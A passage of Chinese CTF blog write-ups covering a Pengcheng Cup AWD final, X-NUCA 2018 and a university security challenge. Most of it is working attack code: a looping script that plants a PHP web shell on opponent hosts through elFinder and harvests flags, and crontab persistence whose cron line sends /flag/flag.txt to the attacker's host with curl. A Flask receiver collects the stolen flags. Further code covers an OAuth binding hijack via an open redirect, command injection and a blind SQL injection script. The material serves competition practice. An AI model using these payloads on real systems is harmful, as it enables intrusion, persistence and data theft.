class="string">'http://172.91.1.12:9090/arace/index'</span>,</span><br><span class="line">			  <span class="string">'Content-Length'</span>: <span class="string">'14'</span>,</span><br><span class="line">			  <span class="string">'Cookie'</span>: <span class="string">'JSESSIONID=51EF0ADB25F425E2BE7C5871C29B1D7A'</span>&#125;</span><br><span class="line"></span><br><span class="line">    req = requests.post(urls,headers = header,<span class="attribute">data</span>=post)</span><br><span class="line">    <span class="builtin-name">print</span> req.content</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'errorInfo'</span> <span class="keyword">not</span> <span class="keyword">in</span> req.content:</span><br><span class="line">    	<span class="builtin-name">print</span> <span class="string">' '</span> + req.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fname = <span class="string">'shell.php'</span></span><br><span class="line">payload = &#123;</span><br><span class="line">				<span class="string">'cmd'</span> : <span class="string">'put'</span>,</span><br><span class="line">				<span class="string">'target'</span> : <span class="string">'l1_'</span>+fname.encode(<span class="string">'base64'</span>,<span class="string">'strict'</span>),</span><br><span class="line">				<span class="string">'content'</span> : <span class="string">'&lt;?php passthru($_GET[\'</span>cmd\<span class="string">']); ?&gt;'</span></span><br><span class="line">				&#125;</span><br><span class="line">cmd = <span class="string">'cat /flag/flag.txt'</span></span><br><span class="line">lists = &#123;<span class="string">'172.91.0.101'</span>,<span class="string">'172.91.0.104'</span>,<span class="string">'172.91.0.106'</span>,<span class="string">'172.91.0.112'</span>,<span class="string">'172.91.0.115'</span>,<span class="string">'172.91.0.116'</span>,<span class="string">'172.91.0.122'</span>,<span class="string">'172.91.0.125'</span>,<span class="string">'172.91.0.135'</span>,<span class="string">'172.91.0.138'</span>,<span class="string">'172.91.0.144'</span>,<span class="string">'172.91.0.18'</span>,<span class="string">'172.91.0.33'</span>,<span class="string">'172.91.0.34'</span>,<span class="string">'172.91.0.35'</span>,<span class="string">'172.91.0.42'</span>,<span class="string">'172.91.0.44'</span>,<span class="string">'172.91.0.45'</span>,<span class="string">'172.91.0.47'</span>,<span class="string">'172.91.0.51'</span>,<span class="string">'172.91.0.53'</span>,<span class="string">'172.91.0.54'</span>,<span class="string">'172.91.0.59'</span>,<span class="string">'172.91.0.60'</span>,<span class="string">'172.91.0.61'</span>,<span class="string">'172.91.0.62'</span>,<span class="string">'172.91.0.64'</span>,<span class="string">'172.91.0.68'</span>,<span class="string">'172.91.0.69'</span>,<span class="string">'172.91.0.70'</span>,<span class="string">'172.91.0.78'</span>,<span class="string">'172.91.0.82'</span>,<span class="string">'172.91.0.87'</span>,<span class="string">'172.91.0.88'</span>,<span class="string">'172.91.0.91'</span>,<span class="string">'172.91.0.92'</span>,<span class="string">'172.91.0.93'</span>,<span class="string">'172.91.0.94'</span>,<span class="string">'172.91.0.97'</span>,<span class="string">'172.91.0.99'</span>&#125;</span><br><span class="line"></span><br><span class="line">mat = re.compile(<span class="string">".*([0-9a-z]&#123;192&#125;).*"</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> lists:</span><br><span class="line">		host = i</span><br><span class="line">		#host = <span class="string">'127.0.0.1/CMS/LunarCMS-master/'</span></span><br><span class="line">		<span class="builtin-name">print</span> host</span><br><span class="line">		try:</span><br><span class="line">			url = <span class="string">'http://'</span>+host+<span class="string">':8080/admin/includes/elfinder/php/connector.php?cmd=mkfile&amp;name='</span> + fname + <span class="string">'&amp;target=l1_XA'</span></span><br><span class="line">			create = requests.<span class="builtin-name">get</span>(url,timeout = 1)</span><br><span class="line">			url2 = <span class="string">'http://'</span>+host+<span class="string">':8080/admin/includes/elfinder/php/connector.php'</span></span><br><span class="line">			write = requests.post(url2, data = payload,timeout = 1)</span><br><span class="line">			url3 = <span class="string">'http://'</span>+host+<span class="string">':8080/files/'</span>+fname+<span class="string">'?cmd='</span>+ cmd</span><br><span class="line"></span><br><span class="line">			execute = requests.<span class="builtin-name">get</span>(url3,timeout = 0.5)</span><br><span class="line">			reverse = execute.content</span><br><span class="line">			<span class="builtin-name">print</span> reverse</span><br><span class="line">			flag = mat.findall(reverse)[0]</span><br><span class="line">			<span class="builtin-name">print</span> flag</span><br><span class="line">			<span class="keyword">if</span> len(flag) &gt; 0 :</span><br><span class="line">				submit_cookie(flag)</span><br><span class="line">		except Exception:</span><br><span class="line">			pass</span><br><span class="line">		sleep(0.5)</span><br><span class="line">	sleep(30)</span><br></pre></td></tr></table></figure>



<h2 id="2-Wordpress源码分析"><a href="#2-Wordpress源码分析" class="headerlink" title="2. Wordpress源码分析"></a>2. Wordpress源码分析</h2><p>Wordpress是4.9版本，下载源码的发现50多M，那很明显是安装了一些插件了（框架源码20多M），本菜主要还是利用Wordpress上的分，毕竟第一天在Lunar CMS上翻车了，得靠第二天翻盘一下。</p>
<h3 id="0x01-普普通通的一句话后门"><a href="#0x01-普普通通的一句话后门" class="headerlink" title="0x01 普普通通的一句话后门"></a>0x01 普普通通的一句话后门</h3><p> 大师傅们问我怎么第一轮就开打了（5分钟一轮），可能我网速比较快吧。边下载源码边往 Webshellkill 甩，很成功的扫到了一个一句话木马<br><img src="/2018/12/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-web%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%A8%B3%E5%AE%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8A%E5%88%86%E4%B9%8B%E8%B7%AF/8418106-44bae86741a0ed93.png" alt></p>
<p>我本以为又可以收一个高大上的马了，点开一看 <code>&lt;?php @eval($_POST[&#39;1&#39;]);?&gt;</code> 直接修改第一天的Exp就开打了，所以速度快了点，操作这么快自然不可能只用来读flag，肯定要干些其他的事，后面写。</p>
<h3 id="0x02-Site-Import插件本地和远程文件包含漏洞"><a href="#0x02-Site-Import插件本地和远程文件包含漏洞" class="headerlink" title="0x02 Site Import插件本地和远程文件包含漏洞"></a>0x02 Site Import插件本地和远程文件包含漏洞</h3><p>这个洞一下没有发现，被打了好几轮，漏洞点在/wp-content/plugins/site-import/admin/page.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">site_import_namespace</span>;</span><br><span class="line"></span><br><span class="line">	$page = $_GET[<span class="string">'url'</span>];</span><br><span class="line">	$url = parse_url($page);</span><br><span class="line">	$url[<span class="string">'path'</span>] = pathinfo(<span class="keyword">isset</span>($url[<span class="string">'path'</span>])?$url[<span class="string">'path'</span>]:<span class="string">''</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($url[<span class="string">'path'</span>][<span class="string">'dirname'</span>]) || $url[<span class="string">'path'</span>][<span class="string">'dirname'</span>]==<span class="string">'\\'</span>)$url[<span class="string">'path'</span>][<span class="string">'dirname'</span>] = <span class="string">'/'</span>;</span><br><span class="line">	<span class="comment">//if($url['path']['dirname'][strlen($url['path']['dirname'])-1]!='/')$url['path']['dirname'] .= '/';</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">change_link</span><span class="params">($text)</span></span>&#123;</span><br><span class="line">		......</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">change_link_2</span><span class="params">($text)</span></span>&#123;</span><br><span class="line">               ......</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$context = stream_context_create(<span class="keyword">array</span>(<span class="string">'http'</span> =&gt; <span class="keyword">array</span>(<span class="string">'max_redirects'</span> =&gt; <span class="number">101</span>)));</span><br><span class="line">	$content = file_get_contents($page, <span class="keyword">false</span>, $context);</span><br><span class="line">	$content = preg_replace_callback(<span class="string">"/(\&lt;(img|link|a) [^\&gt;]*?)(href|src)\=\"([^\"]+?)\"/"</span>, <span class="string">'site_import_namespace\change_link'</span>, $content);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> $content;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>很明显，没有对$page变量做任何处理就直接传到了file_get_contents()函数中，直接导致了文件包含，构造<code>/page.php?url=../../../../../../../../../flag</code>就好了，这里就不贴Exp了</p>
<h3 id="0x03-simple-ads-manager-插件中的SQL注入漏洞"><a href="#0x03-simple-ads-manager-插件中的SQL注入漏洞" class="headerlink" title="0x03 simple-ads-manager 插件中的SQL注入漏洞"></a>0x03 simple-ads-manager 插件中的SQL注入漏洞</h3><p>这个漏洞在这次利用价值不大，毕竟注入出来的都是加密的，注入的流量到处飞，有些队都把数据库给关了  - -.. ，看不懂的操作，这里不过多说明了，可以参考：<a href="https://www.exploit-db.com/exploits/36613" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36613</a> 进行复现测试。</p>
<h2 id="3-简单分享分享这次的打法"><a href="#3-简单分享分享这次的打法" class="headerlink" title="3. 简单分享分享这次的打法"></a>3. 简单分享分享这次的打法</h2><p>第一天的就不写了，主要上分在于第二天，最后 Web3 拿了3800多分，还算不错的，主要因为操作失误，应该是能够那 4000+ 的分的，由于比较快扫到了 Wordpress 中的一句话木马，所以立即连接木马，批量插入了<strong>Crontab</strong>定时任务，利用木马直接调用 system() 函数，嵌入反弹flag的定时任务，不管对方怎么补漏洞，一样能很轻松的拿到 flag 的（<em>本菜第一次线下的时候被一白师傅这样打蒙了</em>）</p>
<figure class="highlight plain"><figcaption><span>\"* * * * * cat</span><a href="/flag/flag.txt">| curl  http://172.91.0.115:3001/flag --data-binary @- \n* * * * * echo \\\"<?php \\\\\\n if(@md5(\\\\\\\$_POST[pass])</a></a></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">一共植入了两条定时任务（按个人需求植入），第一个定时任务是每个一分钟带着flag，post请求我本地开启的3001端口的web服务一次，所以就坐着收flag就好了，第二个定时任务是往网站根木马写马，植入的效果 ↓ ↓ ↓</span><br><span class="line">![](鹏城杯决赛-web源码分析-稳定自动化上分之路&#x2F;8418106-c8e3f8ea1c03a546.png)</span><br><span class="line"></span><br><span class="line">所以本地起个flask服务（比较好自动化提交flag和设定端口），接受 flag 并自动提交就好了，大师傅们问没有权限怎么执行crontab，crontab不需要root权限的，什么用户起的就是什么权限，所以www-data用户注上命令，需要本地上个 shell 去kill才行的。</span><br><span class="line"></span><br><span class="line">![](鹏城杯决赛-web源码分析-稳定自动化上分之路&#x2F;8418106-6f5df9dd01e170f6.png)</span><br><span class="line"></span><br><span class="line">这里放一下一白大师傅写的起flask服务的脚本(修改版)</span><br></pre></td></tr></table></figure>
<h1 id="coding-utf8"><a href="#coding-utf8" class="headerlink" title="- coding:utf8"></a>- coding:utf8</h1><p>from flask import *<br>import requests</p>
<p>app = Flask(<strong>name</strong>)</p>
<p>url = “<a href="http://172.91.1.12:9090/arace/index&quot;" target="_blank" rel="noopener">http://172.91.1.12:9090/arace/index&quot;</a><br>token = “0ade4d3d8b7ed42f”</p>
<p>server_port = 3001</p>
<p>def submit_token(url,answer,token):<br>    data ={“token”:token,”flag”:answer}<br>    resp = requests.post(url,data=data)<br>    if (resp.status_code != “404”):<br>        print “Status code:%d”%(resp.status_code)</p>
<p>def submit_cookie(ip,answer):<br>    submit_ip = ‘172.91.1.12:9090’<br>    urls=’http://%s/ad/hacker/submit/submitCode’% submit_ip<br>    post = {‘flag’:answer}<br>    ‘’’cmder = ‘ %s -b “JSESSIONID=C64DD133EFDDB22CE5BE4CA3991AB6DF” -d “flag=%s”‘% (urls,answer)<br>                #print cmd<br>                os.system(‘curl ‘ + cmder)’’’</p>
<pre><code>header = {&apos;Host&apos;: &apos;172.91.1.12:9090&apos;,
          &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0&apos;,
          &apos;Accept&apos;: &apos;application/json, text/javascript, */*; q=0.01&apos;,
          &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&apos;,
          &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded; charset=UTF-8&apos;,
          &apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;,
          &apos;Referer&apos;: &apos;http://172.91.1.12:9090/arace/index&apos;,
          &apos;Content-Length&apos;: &apos;14&apos;,
          &apos;Cookie&apos;: &apos;JSESSIONID=77A0AFA7757CE43018889FCF9AAFE59A&apos;}

req = requests.post(urls,headers = header,data=post)
print req.content
if &apos;errorInfo&apos; not in req.content:
    print &apos; &apos; + req.content</code></pre><p>last_flag = {}</p>
<p>@app.route(‘/flag’, methods=[‘POST’])<br>def receive_flag():<br>    flag = request.get_data().strip()<br>    ip = request.remote_addr<br>    if not last_flag.has_key(ip):<br>        last_flag[ip] = set()<br>    ip_flag_list = last_flag.get(ip, set())<br>    if flag in ip_flag_list:<br>        print “Receive %s from %s , already submitted.” % (flag, ip)<br>        return “”<br>    ip_flag_list.add(flag)<br>    result = “”<br>    print “\nReceive from : %s\nflag : %s”% (ip,flag)<br>    submit_cookie(ip,flag)<br>    return ‘’</p>
<p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    app.run(“0.0.0.0”, port=server_port)</p>
<p>```</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>能力有限，可能有的洞没有分析出来。本想用一只刚写的病毒性后门来试试的，这次还没有实验，等后续在攻防赛中实验成功后再公开。本菜第二天由于操作失误，第一波拿flag命令输入成了<em>cat /flag</em>，然而flag在 /flag/flag.txt 了，等到第二波注入任务时，掉了好多，所以到最后还是接收了一大堆空字符过来，而且写马的目录还写错了，真的是让人头秃，被大师傅们笑死，血亏。同时开场用shell批量执行命令，其他的恶劣操作就不写了，怕被打死。放一张最终成绩图<br><img src="https://upload-images.jianshu.io/upload_images/8418106-4db54902e9d1c47d.JPG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="最后成绩"></p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>AWD</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>2018 X-NUCA Cyc1e_writeup</title>
    <url>/2018/11/26/2018X-NUCA-Cyc1e-writeup/</url>
    <content><![CDATA[<h3 id="Warm-Up"><a href="#Warm-Up" class="headerlink" title="Warm Up"></a>Warm Up</h3><p>分析流量包，一共包含六组RSA的交互信息，copy出来对比有两组的n是相同的</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">This is a message distribute system. Please tell me your name: </span><br><span class="line">Dave</span><br><span class="line">Hi Dave, your N is: 25118186052801903419891574512806521370646053661385577314262283167479853375867074736882903917202574957661470179148882538361560784362740207649620536746860883395110443930778132343642295247749797041449601967434690280754279589691669366595486824752597992245067619256368446164574344449914827664991591873150416287647528776014468498025993455819767004213726389160036077170973994848480739499052481386539293425983093644799960322581437734560001018025823047877932105216362961838959964371333287407071080250979421489210165485908404019927393053325809061787560294489911475978342741920115134298253806238766543518220987363050115050813263</span><br><span class="line"><span class="keyword">And</span> your exponent is: 6947</span><br><span class="line">Last but <span class="keyword">not</span> least, your<span class="built_in"> secret </span>is: 20494665879116666159961016125949070097530413770391893858215547229071116025581822729798313796823204861624912909030975450742122802775879194445232064367771036011021366123393917354134849911675307877324103834871288513274457941036453477034798647182106422619504345055259543675752998330786906376830335403339610903547255965127196315113331300512641046933227008101401416026809256813221480604662012101542846479052832128788279031727880750642499329041780372405567816904384164559191879422615238580181357183882111249939492668328771614509476229785062819586796660370798030562805224704497570446844131650030075004901216141893420140140568</span><br><span class="line">You will know the<span class="built_in"> secret </span>after I give you P,Q.</span><br><span class="line">See you next time!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">This is a message distribute system. Please tell me your name: </span><br><span class="line">Alice</span><br><span class="line">Hi Alice, your N is: 25118186052801903419891574512806521370646053661385577314262283167479853375867074736882903917202574957661470179148882538361560784362740207649620536746860883395110443930778132343642295247749797041449601967434690280754279589691669366595486824752597992245067619256368446164574344449914827664991591873150416287647528776014468498025993455819767004213726389160036077170973994848480739499052481386539293425983093644799960322581437734560001018025823047877932105216362961838959964371333287407071080250979421489210165485908404019927393053325809061787560294489911475978342741920115134298253806238766543518220987363050115050813263</span><br><span class="line"><span class="keyword">And</span> your exponent is: 7669</span><br><span class="line">Last but <span class="keyword">not</span> least, your<span class="built_in"> secret </span>is: 22917655888781915689291442748409371798632133107968171254672911561608350738343707972881819762532175014157796940212073777351362314385074785400758102594348355578275080626269137543136225022579321107199602856290254696227966436244618441350564667872879196269074433751811632437228139470723203848006803856868237706401868436321225656126491701750534688966280578771996021459620472731406728379628286405214996461164892486734170662556518782043881759918394674517409304629842710180023814702447187081112856416034885511215626693534876901484105593275741829434329109239483368867518384522955176807332437540578688867077569728548513876841471</span><br><span class="line">You will know the<span class="built_in"> secret </span>after I give you P,Q.</span><br><span class="line">See you next time!</span><br></pre></td></tr></table></figure>

<p>一个常规的RSA共模攻击，代码如下</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="attr">from</span> <span class="string">libnum import n2s,s2n</span></span><br><span class="line"><span class="attr">from</span> <span class="string">gmpy2 import invert</span></span><br><span class="line"><span class="attr">def</span> <span class="string">egcd(a, b):</span></span><br><span class="line">  <span class="attr">if</span> <span class="string">a == 0:</span></span><br><span class="line">    <span class="attr">return</span> <span class="string">(b, 0, 1)</span></span><br><span class="line">  <span class="attr">else</span>:<span class="string"></span></span><br><span class="line">    <span class="meta">g,</span> <span class="string">y, x = egcd(b % a, a)</span></span><br><span class="line">    <span class="attr">return</span> <span class="string">(g, x - (b // a) * y, y)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">def</span> <span class="string">main():</span></span><br><span class="line">  <span class="attr">n</span> = <span class="string">25118186052801903419891574512806521370646053661385577314262283167479853375867074736882903917202574957661470179148882538361560784362740207649620536746860883395110443930778132343642295247749797041449601967434690280754279589691669366595486824752597992245067619256368446164574344449914827664991591873150416287647528776014468498025993455819767004213726389160036077170973994848480739499052481386539293425983093644799960322581437734560001018025823047877932105216362961838959964371333287407071080250979421489210165485908404019927393053325809061787560294489911475978342741920115134298253806238766543518220987363050115050813263</span></span><br><span class="line">  <span class="attr">c1</span> = <span class="string">20494665879116666159961016125949070097530413770391893858215547229071116025581822729798313796823204861624912909030975450742122802775879194445232064367771036011021366123393917354134849911675307877324103834871288513274457941036453477034798647182106422619504345055259543675752998330786906376830335403339610903547255965127196315113331300512641046933227008101401416026809256813221480604662012101542846479052832128788279031727880750642499329041780372405567816904384164559191879422615238580181357183882111249939492668328771614509476229785062819586796660370798030562805224704497570446844131650030075004901216141893420140140568</span></span><br><span class="line">  <span class="attr">c2</span> = <span class="string">22917655888781915689291442748409371798632133107968171254672911561608350738343707972881819762532175014157796940212073777351362314385074785400758102594348355578275080626269137543136225022579321107199602856290254696227966436244618441350564667872879196269074433751811632437228139470723203848006803856868237706401868436321225656126491701750534688966280578771996021459620472731406728379628286405214996461164892486734170662556518782043881759918394674517409304629842710180023814702447187081112856416034885511215626693534876901484105593275741829434329109239483368867518384522955176807332437540578688867077569728548513876841471</span></span><br><span class="line">  <span class="attr">e1</span> = <span class="string">6947</span></span><br><span class="line">  <span class="attr">e2</span> = <span class="string">7669</span></span><br><span class="line">  <span class="attr">s</span> = <span class="string">egcd(e1, e2)</span></span><br><span class="line">  <span class="attr">s1</span> = <span class="string">s[1]</span></span><br><span class="line">  <span class="attr">s2</span> = <span class="string">s[2]</span></span><br><span class="line">  <span class="attr">if</span> <span class="string">s1&lt;0:</span></span><br><span class="line">    <span class="attr">s1</span> = <span class="string">- s1</span></span><br><span class="line">    <span class="attr">c1</span> = <span class="string">invert(c1, n)</span></span><br><span class="line">  <span class="attr">elif</span> <span class="string">s2&lt;0:</span></span><br><span class="line">    <span class="attr">s2</span> = <span class="string">- s2</span></span><br><span class="line">    <span class="attr">c2</span> = <span class="string">invert(c2, n)</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">m</span> = <span class="string">pow(c1,s1,n)*pow(c2,s2,n) % n</span></span><br><span class="line">  <span class="attr">print</span> <span class="string">n2s(m)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">if</span> <span class="string">__name__ == '__main__':</span></span><br><span class="line">  <span class="attr">main()</span></span><br></pre></td></tr></table></figure>

<h3 id="Blog"><a href="#Blog" class="headerlink" title="Blog"></a>Blog</h3><p>题目提示了第三方登入认证方式是OAuth2.0的，OAuth2.0存在一个快捷登录授权劫持问题，主要在于code变量，然后就入坑了，最开始的思路是让admin访问快捷登入页面，修改redirect_uri 来抓取重置的code，然后伪造admin用户登入，然后发现redirect_uri不可伪造，就自闭了（具体分析可以看：<a href="https://bbs.ichunqiu.com/thread-34168-1-1.html）。本题的主要利用点在于帐号可重复绑定不同的第三方邮箱，所以让admin绑定上我们注册的邮箱，通过第三方邮箱登入admin帐号即可得到flag。通过/main/register注册一个用户，register需要探测一下" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-34168-1-1.html）。本题的主要利用点在于帐号可重复绑定不同的第三方邮箱，所以让admin绑定上我们注册的邮箱，通过第三方邮箱登入admin帐号即可得到flag。通过/main/register注册一个用户，register需要探测一下</a></p>
<p><img src="/2018/11/26/2018X-NUCA-Cyc1e-writeup/8418106-35fe46782118d653.png" alt><br>第三方登入方式注册一个邮箱帐号用来绑定，通过绑定第三方邮箱，截取绑定的流量包</p>
<p><img src="/2018/11/26/2018X-NUCA-Cyc1e-writeup/8418106-901058431549ca2d.png" alt></p>
<p>绑定第三方邮箱主要通过state和code进行认证，即只要state和code正确，即可绑定成功，并不校验绑定的账户是什么，从而可以达到绑定其他用户并覆盖绑定邮箱的目的，所以我们可以让admin用户去访问Url：<a href="http://106.75.66.211:8000/main/oauth/?state=svFglsaloQ&code=AoWZd4NJLHuVomqQn2hWoDAp6hP6nz03VqDbp6sa" target="_blank" rel="noopener">http://106.75.66.211:8000/main/oauth/?state=svFglsaloQ&amp;code=AoWZd4NJLHuVomqQn2hWoDAp6hP6nz03VqDbp6sa</a> 便可以达到让admin帐号绑定上我们邮箱的效果，并且后台设置了bot，所以我们可以通过post_bug提交绑定的Url来让admin访问，由于提交框有长度限制，所以直接提交是没有办法的。</p>
<p><img src="/2018/11/26/2018X-NUCA-Cyc1e-writeup/8418106-1d2bf17a7627737b.png" alt></p>
<p>由于<a href="http://106.75.66.211:8000/main/login?next=/main/login" target="_blank" rel="noopener">http://106.75.66.211:8000/main/login?next=/main/login</a> 处存在重定向，所以我们可以通过重定向跳转到vps上，即<a href="http://106.75.66.211:8000/main/login?next=[your_ip]" target="_blank" rel="noopener">http://106.75.66.211:8000/main/login?next=[your_ip]</a> 在vps上写一个跳转页面</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.open(<span class="string">'http://106.75.66.211:8000/main/oauth/?state=9PKyRdpU5D&amp;code=Y5WjDdELjUMGaJpbYfs9lOPBtgEvrOOvZxmmwZsj'</span>)</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>将vps跳转页面地址压缩成短链（ 推荐个短链生成地址：<a href="https://bitly.com" target="_blank" rel="noopener">https://bitly.com</a> ），提交bug，最终提交Url为：<a href="http://106.75.66.211:8000/main/login?next=https://bit.ly/2Qiixxx" target="_blank" rel="noopener">http://106.75.66.211:8000/main/login?next=https://bit.ly/2Qiixxx</a> 等待bot访问后利用第三方邮箱登入</p>
<p><img src="/2018/11/26/2018X-NUCA-Cyc1e-writeup/8418106-fb8e409e2de06be0.png" alt></p>
<h3 id="ezdotso"><a href="#ezdotso" class="headerlink" title="ezdotso"></a>ezdotso</h3><p>题目配置问题，上手甩一个cat /flag就出了，我和小伙伴都惊呆了。?action=cmd&amp;cmd=ls%20/ 列根目录，flag在根目录下<br><img src="/2018/11/26/2018X-NUCA-Cyc1e-writeup/8418106-bc74376afd02b60f.png" alt></p>
<p>?action=cmd&amp;cmd=cat%20/flag出奇迹……<br><img src="/2018/11/26/2018X-NUCA-Cyc1e-writeup/8418106-f9fee2030f214445.png" alt></p>
<p><strong>ps:其他几个web都比较难，怼到自闭，最后ROIS出了hardphp，还有js+wasm和web+pwn的，又可以学习一波了。</strong></p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>RSA</tag>
        <tag>OAuth2.0</tag>
      </tags>
  </entry>
  <entry>
    <title>2018高校网络信息安全管理运维挑战赛Web_Writeup</title>
    <url>/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>emmmm，很久没有好好的打比赛了，基本都是滑水，认真打的时候又被一些脑洞卡一天，难受，这次的题比较简单，所以Writeup也就简单些写了，可惜不会逆向，不然应该有那么点可能AK吧。</p>
<h3 id="SimpleBBS"><a href="#SimpleBBS" class="headerlink" title="SimpleBBS"></a>SimpleBBS</h3><p>一个普通的BBS，进去随手在登入框输了个‘ ‘ ’就报错了，直接把SQL语句都爆出来了</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-f0e585b5e166c7dd.png" alt><br>甩sqlmap爆破，爆破的时候把level设置高一些，很多问我怎么他们没爆出来，应该就是因为level的原因吧。flag放在bbs库flag表flag字段里。</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-3da046af8ea5f69d.png" alt></p>
<h3 id="SimpleBlog"><a href="#SimpleBlog" class="headerlink" title="SimpleBlog"></a>SimpleBlog</h3><p>这道题目很明显是二次注入，由于很讨厌写注入的题，所以也是很后面才写，主要逻辑在于注册用户时我们插入SQL查询语句，登入后也在主页面提示分数为0什么的信息，所以在Final Exam页面测试，如果返回值显示的分数为非0，那么则表示注入的查询语句查询正确，若返回显示的分数为0，则说明查询失败，所以典型的盲注了，构造payload：’ or if((ascii(substr((select flag from flag),1,1))=1),1,0)=’1’ or ‘ 作为注册用户名，这里坑了一下，刚开始用的是 and，在insert的时候 and 和 &amp;&amp; 不会当作逻辑运算符执行，所以用 or 或者 || ，写个盲注脚本就好了。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">url = <span class="string">'http://210.32.4.20/register.php'</span></span><br><span class="line">url_2 = <span class="string">'http://210.32.4.20/login.php'</span></span><br><span class="line">url_3 = <span class="string">'http://210.32.4.20/answer.php'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,50):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(32,126):</span><br><span class="line">		<span class="attribute">ss</span>=requests.session()</span><br><span class="line">		payload = <span class="string">"\' or if((ascii(substr((select flag from flag),"</span> + str(i) + <span class="string">",1))="</span> + str(j) + <span class="string">"),1,0)='1' or \'"</span></span><br><span class="line">		post_an = &#123;<span class="string">'1.a'</span>:<span class="string">'on'</span>&#125;</span><br><span class="line">		post_data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</span><br><span class="line">		r = ss.post(<span class="attribute">url</span>=url,data=post_data)</span><br><span class="line">		login = ss.post(<span class="attribute">url</span>=url_2,data=post_data)</span><br><span class="line">		an = ss.post(<span class="attribute">url</span>=url_3,data=post_an)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'Your grades is 0'</span> <span class="keyword">not</span> <span class="keyword">in</span> an.content:</span><br><span class="line">			e = chr(j)</span><br><span class="line">			result = result + e</span><br><span class="line">			<span class="builtin-name">print</span> result</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-3aa8fbe13ff8acf7.png" alt></p>
<h3 id="SimpleExtensionExplorerInjection"><a href="#SimpleExtensionExplorerInjection" class="headerlink" title="SimpleExtensionExplorerInjection"></a>SimpleExtensionExplorerInjection</h3><p>题目写得很清楚这题是XXE的点，所以先抓一个http request包</p>
